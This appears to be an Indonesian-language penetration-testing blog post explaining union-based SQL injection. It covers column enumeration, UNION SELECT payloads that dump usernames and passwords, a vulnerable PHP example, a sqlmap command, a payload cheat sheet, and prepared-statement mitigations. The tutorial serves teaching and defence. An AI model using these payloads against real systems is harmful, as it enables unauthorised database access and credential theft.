---
title: "SQL Injection — Union Based"
date: 2026-04-01T01:00:01+07:00
draft: false
author: "Andrew"
summary: "Union-Based SQL Injection adalah teknik di mana attacker menggunakan kata kunci SQL UNION untuk menambahkan query tambahan ke statement asli, memungkinkan mereka untuk mengekstrak data dari tabel lain di database."
tags: ["Web Penetration Testing", "SQL Injection", "Union Based"]
categories: ["Web Penetration Testing", "SQL Injection"]
description: ""
---

# SQL Injection — Union Based (ID)

## Apa Itu SQLi Union-Based?

Dari semua jenis SQL injection, **Union-Based SQLi** adalah yang paling "bersih", dalam arti attacker bisa secara langsung melihat hasil query yang diinjectkan. Teknik ini memanfaatkan kata kunci SQL `UNION` untuk menambahkan query baru ke statement asli, sehingga attacker bisa mengekstrak data dari tabel-tabel lain di database.

Sederhananya: aplikasi webmu punya query yang mengembalikan data, dan attacker menambahkan query tambahan dengan `UNION` untuk mengekstrak data. Hasilnya? Mereka bisa melihat apa saja yang ada di database seperti username, password, credit card, semuanya.

---

## Cara Kerjanya

**1. Identifikasi Jumlah Kolom**

Sebelum menggunakan `UNION`, attacker perlu tahu berapa banyak kolom yang dikembalikan oleh query asli. Ini dilakukan dengan `ORDER BY`:

```
GET /products?id=1 ORDER BY 1--
GET /products?id=1 ORDER BY 2--
GET /products?id=1 ORDER BY 3--
-- Terus sampai error terjadi (jumlah kolom ditemukan)
```

**2. Temukan kolom yang displayed**

Attacker menguji setiap kolom dengan NULL values:

```
GET /products?id=-1 UNION SELECT NULL--
GET /products?id=-1 UNION SELECT NULL,NULL--
-- Sampai berhasil, kolom yang displayed ditandai dengan nilai yang terlihat
```

**3. Ekstrak Data**

Sekarang attacker tahu kolom mana yang displayed, mereka bisa mengisi dengan data dari tabel lain:

```
GET /products?id=-1 UNION SELECT username,password FROM users--
```

**Diagram Serangan:**

```
┌──────────────────────────────────────────────────────────────┐
│  APP QUERY:                                                  │
│  SELECT name, price FROM products WHERE id = 1              │
│                                                              │
│  ATTACKER INPUT:                                             │
│  id = -1 UNION SELECT username,password FROM users--         │
│                                                              │
│  RESULTING QUERY:                                            │
│  SELECT name, price FROM products WHERE id = -1             │
│  UNION                                                       │
│  SELECT username, password FROM users                       │
└──────────────────────────────────────────────────────────────┘
```

---

## Contoh Vulnerable Code

**PHP — Vulnerable:**

```php
$product_id = $_GET['id'];
$query = "SELECT name, description, price FROM products WHERE id = $product_id";
$result = mysqli_query($conn, $query);
```

**Apa yang attacker kirim:**

```
https://example.com/product?id=-1 UNION SELECT username,email,password FROM users--
```

**Yang terjadi:**

```sql
SELECT name, description, price FROM products WHERE id = -1
UNION
SELECT username, email, password FROM users
```

Semua username, email, dan password dari tabel users langsung terbuka.

---

## Dampak

| Severity | Impact |
|----------|--------|
| **Critical** | Kompromi total database — data apa saja bisa diambil |
| **High** | Authentication bypass, privilege escalation |
| **Medium** | Data exposure (PII, financial records) |

---

## Mitigasi

```php
// Secure: Menggunakan Prepared Statements
$stmt = $conn->prepare("SELECT name, description, price FROM products WHERE id = ?");
$stmt->bind_param("i", $product_id);
$stmt->execute();
$result = $stmt->get_result();
```

**Prinsip umum:**
```
✅ Prepared Statements / Parameterized Queries
✅ Input validation (tipenya harus integer untuk id)
✅ Least privilege — DB user hanya baca tabel yang perlu
✅ WAF sebagai layer tambahan defense
✅ Regular code review
```

---

## Tools Detection

| Tool | Command |
|------|---------|
| sqlmap | `sqlmap -u "https://example.com/product?id=1" --union-cols 2-4` |
| Burp Suite | Gunakan Repeater untuk manual testing |
| nuclei | Templates untuk SQLi detection |

**Manual testing:**
```
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT username,password FROM users--
```

---

## Cheat Sheet

| Testing | Payload | Expected |
|---------|---------|----------|
| Find columns | `ORDER BY N--` | Error when N > column count |
| Union exploit | `UNION SELECT col1,col2 FROM users--` | Data displayed |
| String extraction | `UNION SELECT CONCAT(username,0x3a,password),NULL FROM users--` | colon-separated values |
| Database version | `UNION SELECT @@version,NULL--` | Version info |
| List tables | `UNION SELECT table_name,NULL FROM information_schema.tables--` | Table names |

---

## Referensi

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
